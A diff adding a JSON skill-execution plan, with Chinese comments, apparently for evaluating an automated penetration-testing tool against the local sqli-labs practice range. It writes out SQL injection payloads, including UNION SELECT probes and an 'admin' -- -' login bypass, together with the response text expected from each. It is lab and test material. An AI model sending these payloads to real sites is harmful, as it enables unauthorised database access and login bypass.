@@ -1,0 +1,112 @@
+{
+  "_comment": [
+    "sqli-labs 靶场的技能执行计划。",
+    "本机环境见 docs/靶场环境搭建.md：XAMPP（Apache 80 + MariaDB 3307），",
+    "sqli-labs 使用 PHP7+ 适配版（原版用 mysql_* 函数，PHP 8 上跑不起来）。",
+    "",
+    "判据设计要点：该靶场的 sql-connect.php 里有 @error_reporting(0)，",
+    "SQL 报错被有意屏蔽 —— 用「是否报错」当判据会假阴性。",
+    "因此全部改用差分法：基线 → 破坏 → 注释修复 → UNION 回显。",
+    "回显标记取自实测的原始 HTML（见 eval/ranges/probe_ranges.py）。"
+  ],
+
+  "lab-recon-endpoints": {
+    "actions": [
+      { "method": "GET", "path": "/sqli-labs/" },
+      { "method": "GET", "path": "/sqli-labs/Less-1/", "query": { "id": "1" } },
+      { "method": "GET", "path": "/sqli-labs/Less-11/" }
+    ],
+    "verify": [
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/sqli-labs/Less-1/", "query": { "id": "1" } },
+        "assert": { "contains": ["Your Login name:Dumb"] }
+      },
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/sqli-labs/Less-11/" },
+        "assert": { "contains": ["name=\"uname\""] }
+      }
+    ],
+    "finding_kind": "endpoint-discovery",
+    "severity": "info",
+    "asset": "/sqli-labs/",
+    "discover_assets": [
+      { "kind": "endpoint", "value": "/sqli-labs/" },
+      { "kind": "endpoint", "value": "/sqli-labs/Less-1/?id=" },
+      { "kind": "endpoint", "value": "/sqli-labs/Less-11/ (POST uname,passwd)" }
+    ]
+  },
+
+  "sqli-less1-char-injection": {
+    "actions": [
+      { "method": "GET", "path": "/sqli-labs/Less-1/", "query": { "id": "1" } },
+      { "method": "GET", "path": "/sqli-labs/Less-1/", "query": { "id": "1'" } },
+      { "method": "GET", "path": "/sqli-labs/Less-1/", "query": { "id": "1'-- -" } },
+      { "method": "GET", "path": "/sqli-labs/Less-1/", "query": { "id": "-1' UNION SELECT 1,2,3-- -" } }
+    ],
+    "verify": [
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/sqli-labs/Less-1/", "query": { "id": "1" } },
+        "assert": { "contains": ["Your Login name:Dumb"] }
+      },
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/sqli-labs/Less-1/", "query": { "id": "1'" } },
+        "assert": { "not_contains": ["Your Login name"] }
+      },
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/sqli-labs/Less-1/", "query": { "id": "1'-- -" } },
+        "assert": { "contains": ["Your Login name:Dumb"] }
+      },
+      {
+        "kind": "body_contains",
+        "request": {
+          "method": "GET",
+          "path": "/sqli-labs/Less-1/",
+          "query": { "id": "-1' UNION SELECT 1,2,3-- -" }
+        },
+        "assert": { "contains": ["Your Login name:2<br>Your Password:3"] }
+      }
+    ],
+    "finding_kind": "sql-injection",
+    "severity": "high",
+    "asset": "/sqli-labs/Less-1/?id="
+  },
+
+  "sqli-less11-auth-bypass": {
+    "actions": [
+      { "method": "POST", "path": "/sqli-labs/Less-11/", "body": { "uname": "admin", "passwd": "admin", "submit": "Submit" } },
+      { "method": "POST", "path": "/sqli-labs/Less-11/", "body": { "uname": "admin", "passwd": "wrong", "submit": "Submit" } },
+      { "method": "POST", "path": "/sqli-labs/Less-11/", "body": { "uname": "admin' -- -", "passwd": "wrong", "submit": "Submit" } },
+      { "method": "POST", "path": "/sqli-labs/Less-11/", "body": { "uname": "-1' union select 1,2#", "passwd": "x", "submit": "Submit" } }
+    ],
+    "verify": [
+      {
+        "kind": "body_contains",
+        "request": { "method": "POST", "path": "/sqli-labs/Less-11/", "body": { "uname": "admin", "passwd": "admin", "submit": "Submit" } },
+        "assert": { "contains": ["Your Login name:admin"] }
+      },
+      {
+        "kind": "body_contains",
+        "request": { "method": "POST", "path": "/sqli-labs/Less-11/", "body": { "uname": "admin", "passwd": "wrong", "submit": "Submit" } },
+        "assert": { "not_contains": ["Your Login name"] }
+      },
+      {
+        "kind": "body_contains",
+        "request": { "method": "POST", "path": "/sqli-labs/Less-11/", "body": { "uname": "admin' -- -", "passwd": "wrong", "submit": "Submit" } },
+        "assert": { "contains": ["Your Login name:admin"] }
+      },
+      {
+        "kind": "body_contains",
+        "request": { "method": "POST", "path": "/sqli-labs/Less-11/", "body": { "uname": "-1' union select 1,2#", "passwd": "x", "submit": "Submit" } },
+        "assert": { "contains": ["Your Login name:1"] }
+      }
+    ],
+    "finding_kind": "auth-bypass",
+    "severity": "critical",
+    "asset": "/sqli-labs/Less-11/ (POST uname)"
+  }
+}
